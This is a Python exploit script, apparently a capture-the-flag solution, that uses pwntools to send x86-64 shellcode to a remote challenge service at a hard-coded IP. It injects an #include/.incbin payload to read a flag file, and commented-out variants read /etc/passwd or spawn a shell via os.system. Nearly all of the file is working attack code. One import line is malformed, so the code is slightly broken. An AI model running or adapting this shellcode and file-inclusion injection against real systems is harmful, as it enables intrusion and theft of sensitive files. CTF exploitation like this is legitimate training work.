from __future__ import division, print_function
import random from pwn import *
import argparse
import time

context.arch = 'amd64'

context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "52.192.42.215"
    port = 9427
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)

def myasm(code):
    bcode, _ = ks.asm(code)
    return ''.join(map(chr, bcode))


#shellcode = ''
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('mov r13,[rdi]')
#shellcode += asm('mov [rdi],r13')
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('xor eax, eax')
#shellcode += asm('mov ecx,0x200')
#shellcode += asm('rep stos QWORD PTR es:[rdi],rax')
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('mov ecx,0x200')
#shellcode += asm('xor eax, eax')
#shellcode += exit



exit = '''\
mov rdi, 0
mov rax, 60
syscall
'''
exit = ''.join(map(myasm, exit.strip('\n').split('\n')))
#exit = '\xB8\x3C\x00\x00\x00\x0F\x05'

#evil = '*/.incbin "/etc/passwd" /*'
#evil = '10\n/*()*/.incbin "/home/deploy/flag"'
#evil = '1 \n#include "/home/deploy/flag" 2/*\nlen(\'\'\'*/\n.incbin \"/home/deploy/flag\" /*\n\'\'\')#*/'
evil = '1 \n#include "/home/deploy/flag"'
#evil = 'rbp // hoge'
#evil = 'os.system("sh")'
#evil = '10'

strs = dict()

strs['msg'] = 'stack address @ 0x10\n'
strs['msg2'] = evil + '@' + '\n'

STR_BASE = 0xdead0020
CODE_BASE = 0xdead0100
BSS_BASE = 0x02170000

head = myasm('mov rax, {}'.format(CODE_BASE)) + myasm('call rax')
head += '\x90' * (0x20 - len(head)) # padding

bss = ''
for k, s in strs.items():
    pos = STR_BASE + len(bss)
    strs[k] = (pos, len(s))
    bss += s

head += bss

def puts_str(msg, sock=1):
    pos, len = strs[msg]
    return myasm('mov rdi, {}'.format(pos)) + asm(shellcraft.write(sock, 'rdi',
        len))

head += '\x90' * (0x100 - len(head))


body = ''
body += puts_str('msg')
body += asm('mov rdi, {}'.format(BSS_BASE))
body += asm(shellcraft.read(0, 'rsp', 300))
body += asm(shellcraft.connect('127.0.0.1', 31337))
body += asm(shellcraft.itoa('rbp'))
body += puts_str('msg2', 'rbp')

#body += asm('mov rdi, {}'.format(BSS_BASE))
#body += asm(shellcraft.read(0, 'rsp', 300))


main = head + body + exit

print('BASE =', len(main))

shellcode = ''
shellcode += main
print('len', len(shellcode))

recvuntil('2000)')
sendline(str(len(shellcode)))
recvuntil('bytes..')
sendline(shellcode)

with open('dump', 'w') as f:
    f.write('{}\n'.format(len(shellcode)))
    f.write(shellcode)

#interactive()
